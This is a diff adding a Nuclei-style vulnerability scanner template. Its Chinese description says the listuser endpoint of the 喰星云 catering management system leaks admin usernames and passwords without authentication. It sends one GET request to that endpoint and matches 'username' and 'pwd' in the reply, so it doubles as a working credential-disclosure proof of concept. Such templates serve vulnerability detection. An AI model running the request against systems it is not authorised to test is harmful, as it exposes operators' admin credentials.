@@ -1,0 +1,25 @@
+id: ysyszhcy-listuser-info
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: 喰星云·数字化餐饮服务系统 listuser 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，导致后台权限被控，造成信息泄露，使系统处于极不安全的状态
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%96%B0%E6%98%9F%E4%BA%91-%E6%95%B0%E5%AD%97%E5%8C%96%E9%A4%90%E9%A5%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Flistuser%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/chainsales/head/user/listuser"
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'username'
+      - type: word
+        part: body
+        words:
+          - 'pwd'
